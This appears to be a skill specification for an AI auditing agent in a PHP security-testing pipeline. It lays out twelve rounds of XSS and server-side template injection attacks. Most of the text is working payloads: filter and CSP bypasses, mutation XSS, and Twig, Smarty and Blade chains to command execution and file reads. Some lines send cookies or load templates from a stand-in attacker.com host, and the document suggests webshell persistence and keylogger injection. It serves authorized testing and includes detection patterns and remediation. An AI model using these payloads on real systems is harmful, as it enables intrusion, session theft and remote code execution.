> **Skill ID**: S-046-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploits/{sink_id}.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-046-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against XSS / SSTI (Cross-Site Scripting / Server-Side Template Injection) sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 12 attack rounds — if stuck after round 10, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST confirm XSS by verifying payload appears UNENCODED in response body; for SSTI must verify template expression evaluates (e.g., `{{7*7}}` → `49`) | FAIL — encoded output falsely reported as XSS |

## 12 Attack Rounds

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R1 - Basic Tag Injection and SSTI Probing

Objective: Test unescaped output and template expression evaluation.

XSS Payload:
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<b>bold_test</b>` (safe canary to confirm HTML rendering)

SSTI Payload:
- `{{7*7}}` (Twig/Jinja -> expected 49)
- `${7*7}` (Smarty/generic -> expected 49)
- `<%= 7*7 %>` (ERB style)
- `{{config}}` (framework configuration disclosure)

Inject into all reflected parameters. Analyze response source for unescaped tags and evaluated expressions.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R2 - Encoding Bypass

Objective: Bypass input sanitization filters through character encoding.

XSS Payload:
- HTML entities: `&#60;script&#62;alert(1)&#60;/script&#62;`
- URL encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
- Unicode escapes: `\u003cscript\u003ealert(1)\u003c/script\u003e`
- Hex encoding: `\x3cscript\x3ealert(1)\x3c/script\x3e`
- Double encoding: `%253Cscript%253E`

SSTI Payload:
- `{%25+if+1+%25}yes{%25+endif+%25}` (URL-encoded Twig)
- `\x7b\x7b7*7\x7d\x7d` (hex-encoded curly braces)

Send encoded payloads to test whether the application decodes before or after sanitization.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R3 - Event Handlers and SSTI Code Execution

Objective: Achieve XSS via HTML event handlers and escalate SSTI to code execution.

XSS Payload:
- `<img src=x onerror=alert(document.cookie)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`
- `<marquee onstart=alert(1)>`
- `<details open ontoggle=alert(1)>`

SSTI Payload (Twig):
- `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
- `{{['id']|filter('system')}}`
- `{{app.request.server.get('DOCUMENT_ROOT')}}`

SSTI Payload (Smarty):
- `{system('id')}`
- `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R4 - Tag Obfuscation and Twig _self.env Exploitation

Objective: Bypass tag filters using obfuscated HTML and exploit Twig internal objects.

XSS Payload:
- `<svg/onload=alert(1)>` (no space before event)
- `<svg onload=alert(1)//` (unclosed tag)
- `<ScRiPt>alert(1)</sCrIpT>` (mixed case)
- `<<script>alert(1)//<</script>` (nested angle brackets)
- `<iframe src="javascript:alert(1)">`
- `<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">`

SSTI Twig _self.env exploitation:
- `{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("backdoor")}}`
- `{{_self.env.enableDebug()}}{{_self.env.disableStrictVariables()}}`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R5 - Smarty {php} and {if} Injection

Objective: Exploit Smarty template engine specific features.

Payload:
- `{php}echo shell_exec('id');{/php}` (Smarty < 3.1, deprecated but may still work)
- `{if system('id')}{/if}`
- `{if readfile('/etc/passwd')}{/if}`
- `{$smarty.version}` (version disclosure)
- `{fetch file="/etc/passwd"}`
- `{include file="/etc/passwd"}`
- `{Smarty_Internal_Write_File::writeFile('/tmp/proof','pwned',self::clearConfig())}`

Send each payload one by one across all Smarty template contexts. Analyze whether `{literal}` blocks prevent injection.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6 - DOM-Based XSS

Objective: Exploit client-side JavaScript that unsafely handles user input.

Sink patterns to identify:
- `document.write(location.hash)`
- `element.innerHTML = user_input`
- `eval(location.search)`
- `$.html(user_data)` (jQuery)
- `window.location = user_input` (open redirect / javascript: URI)

Payload:
- `http://target/#<img src=x onerror=alert(1)>`
- `http://target/?q=<svg/onload=alert(1)>`
- `javascript:alert(document.domain)` (redirect sink)

Analyze page JavaScript source for sink-source data flow. Use browser developer tools or static analysis.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R7 - CSP Bypass and Blade @php Injection

Objective: Bypass Content Security Policy and exploit Laravel Blade directives.

CSP bypass techniques:
- Look for CDNs that allow user-uploaded content (e.g., `cdnjs.cloudflare.com`)
- `<script src="https://allowed-cdn.com/angular.js"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>`
- `<base href="https://attacker.com/">` (base tag hijacking)
- `<script nonce="BRUTE">alert(1)</script>` (nonce brute force, impractical but tested)

Blade @php injection:
- `@php system('id') @endphp`
- `@if(system('id')) @endif`
- `{!! '<script>alert(1)</script>' !!}` (raw output confirmation)

Send Blade directive payloads to test whether they are processed within user-controllable template content.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R8 - Combination: Stored XSS + SSTI Chain → RCE

Objective: Chain stored XSS with SSTI exploitation for maximum impact.

Steps:
1. Find stored input fields (comments, profiles, forum posts)
2. Inject combined payload: `<script>alert(1)</script>{{7*7}}`
3. Determine which engine processed the input (analyze whether 49 or the literal appears in the response)
4. If SSTI is confirmed, escalate:
   - Twig: `{{['id']|filter('system')}}` command execution
   - Smarty: `{if system('id')}{/if}`
   - Blade: `@php system('id') @endphp`
5. If only XSS is confirmed, chain:
   - Cookie theft: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`
   - CSRF to admin operations
   - Keylogger injection

Full combination: Stored SSTI -> write webshell -> persistent RCE.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R9 - Mutation XSS (mXSS)

Objective: Exploit browser HTML parser mutation behavior to bypass sanitizers like DOMPurify.

Payload:
- `<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">`
- `<svg><![CDATA[><img src=x onerror=alert(1)>]]>`
- `<noscript><img src=x onerror=alert(1)></noscript>` (parsing differences when browser has JS enabled)
- `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">`

Principle: Switching between different parsing contexts in the HTML spec (math/svg/foreign content) causes the sanitizer and browser to see different DOM trees.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R10 - Prototype Pollution → XSS

Objective: Achieve client-side prototype pollution through server-side JSON merging.

Checks:
- Unexpected behavior of `array_merge_recursive()` when handling nested JSON
- `json_decode()` + deep merge leading to `__proto__` pollution
- Payload: `{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}`
- Client-side Lodash/jQuery `$.extend(true, {}, userInput)`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R11 - PHP 8.x Template Engine New Feature Exploitation

- Twig 3.x:
  - `{{ source('/etc/passwd') }}` function
  - `{{ include('/etc/passwd') }}`
  - `{{ constant('PHP_VERSION') }}`
  - `{{ random() }}` information disclosure
- Blade (Laravel 9+):
  - Injection in `@js($variable)` directive
  - Injection in `@class`, `@style` directives
  - XSS in Livewire components (`wire:model` two-way binding)
- Smarty 4.x/5.x:
  - Security policy bypass: `{$smarty.const.PHP_VERSION}`
  - Modifier injection: `{"id"|system}`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R12 - WebSocket / SSE XSS

Objective: Inject XSS via WebSocket or Server-Sent Events.

- Unescaped HTML in WebSocket messages output to DOM
- SSE `data:` field content directly assigned to innerHTML
- Stored XSS in real-time chat/notification systems
- Injection in Pusher/Laravel Echo events

## Workflow

1. Identify all output points and determine the template engine (Twig, Smarty, Blade, native)
2. Execute R1 through R8, testing reflected and stored contexts, escalating progressively on failure
3. Verify XSS in browser rendering. Compare SSTI output against expected evaluation results
4. Document all attempts and generate a report after all rounds are completed

## Report Format

Each finding:
```
[Confirmed] XSS/SSTI - Round X
Type: Reflected XSS / Stored XSS / DOM XSS / SSTI (Twig/Smarty/Blade)
Endpoint: POST /comment.php
Parameter: body
Payload: {{['id']|filter('system')}}
Evidence: Response contains "uid=33(www-data)" (SSTI) or unescaped <script> tag (XSS)
Severity: Critical
Remediation: Use htmlspecialchars() to escape all output. Use {{ }} (escaped) instead of {!! !!}. Sandbox the template engine. Disable dangerous template functions.
```

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential XSS or SSTI vulnerabilities:
- Pattern 1: `echo $_GET['q']` / `<?= $userInput ?>` — User input directly output to HTML without `htmlspecialchars()`
- Pattern 2: `{!! $variable !!}` — Laravel Blade unescaped raw output
- Pattern 3: `$twig->render("Hello " . $userInput)` / `$twig->createTemplate($userInput)` — User input concatenated into template string, can trigger SSTI
- Pattern 4: `{if system('id')}{/if}` — Smarty `{if}` tag can execute PHP functions
- Pattern 5: `element.innerHTML = userInput` / `document.write(location.hash)` — DOM-based XSS, client-side JavaScript writes user input into DOM
- Pattern 6: `{{_self.env.registerUndefinedFilterCallback("system")}}` — Twig SSTI → RCE exploitation chain
- Pattern 7: `@php system('id') @endphp` — Blade template directive injection (when template content is user-controllable)

## Key Insight

> **Key Point**: XSS auditing focuses on "whether the output point is escaped," while SSTI auditing focuses on "whether the template engine processes user input." The intersection lies in stored scenarios — user input is first stored in the DB, then may trigger both XSS and SSTI when rendered by the template engine. Priority order: SSTI > Stored XSS > Reflected XSS > DOM XSS (ranked by exploitability).

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger a smart pivot:

1. Re-reconnaissance: Re-read the target code looking for missed filtering logic and alternative entry points
2. Cross-intelligence: Consult findings from other specialists in the shared findings database (`$WORK_DIR/audit_session.db`)
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths are found, terminate early to avoid wasting rounds producing hallucinated results

## Prerequisites and Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions (Prerequisites)
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for that route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` lists all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-XSS-001"
}
```
- All reason fields MUST be filled with specific justifications; they MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_XSS_OUTPUT_POINT` — XSS output point location ✅ Required
- `EVID_XSS_USER_INPUT_MAPPING` — User input to output mapping ✅ Required
- `EVID_XSS_ESCAPE_STATUS` — Escape status ✅ Required
- `EVID_XSS_PAYLOAD_REFLECTION` — Payload reflection evidence (required when confirmed)
- `EVID_TPL_ENGINE_ENTRY` — Template engine entry point (conditionally required for SSTI)
- `EVID_TPL_EXPR_CONTROL` — Template expression control (conditionally required for SSTI)

Missing required EVID → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (format per the write protocol in `shared/attack_memory.md`):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After all rounds are completed, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit.json`).

> The `## Report Format` above is the per-round internal recording format; the final output MUST be consolidated into the exploit.json structure.

## Real-Time Sharing and Second-Order Tracking

### Shared Reading
Read the shared findings database before starting the attack phase to leverage WAF bypass methods discovered by other auditors.

### Second-Order Tracking
Record all user input written to DB in `$WORK_DIR/second_order/store_points.jsonl`.
Record all locations where data is retrieved from DB and output to HTML in `$WORK_DIR/second_order/use_points.jsonl`.

## Constraints

- MUST NOT inject payloads that cause permanent damage. Use identifiable markers for easy cleanup.
- Stay within the authorized scope; only test authorized applications and document all attempts.



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "xss_search_001",
  "final_verdict": "confirmed",
  "rounds_executed": 4,
  "successful_round": 1,
  "payload": "<script>alert(document.cookie)</script>",
  "evidence_result": "Unescaped <script> tag rendered in response body, browser executes alert()",
  "severity": {
    "level": "H",
    "score": 2.1,
    "cvss": 7.0
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.1 → cvss 7.0 → level `H`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "xss_search_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": "<script>alert(1)</script>",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "L",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no proof that payload is rendered unescaped
- failure_reason is empty — no context about output encoding status
- severity_level 'L' for confirmed reflected XSS — should be at least M or H

---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-checks per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); proceed only after all are ✅
2. Execute the specialized checks below (S1-S3); submit only after all are ✅
3. If any item is ❌ → fix and re-check; MUST NOT skip

### Specialized Self-Checks (XSS/SSTI Auditor Specific)
- [ ] S1: XSS type (Reflected/Stored/DOM) and SSTI engine type (Twig/Blade/Smarty) are labeled and match the sink point
- [ ] S2: Evidence of unescaped special characters in the payload is presented (XSS: htmlspecialchars; SSTI: sandbox escape path)
- [ ] S3: XSS→SSTI escalation path or the complete exploitation chain from template injection to RCE is presented

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| CSP blocks script execution | Attempt CSP bypass (unsafe-eval, base-uri, trusted-types abuse); if enforced → record `"csp_enforced": true` |
| Output encoding neutralizes XSS payload | Try context-specific bypass (attribute, event handler, SVG, MathML); if encoded → record `"status": "output_encoded"` |
| Template engine sandbox blocks SSTI payload | Attempt sandbox escape via built-in objects or prototype chain; if sandboxed → record `"status": "ssti_sandboxed"` |
| Payload blocked by WAF/filter | Log filter type, switch to obfuscated payload variant; if all variants fail → record `"waf_blocked": true` |
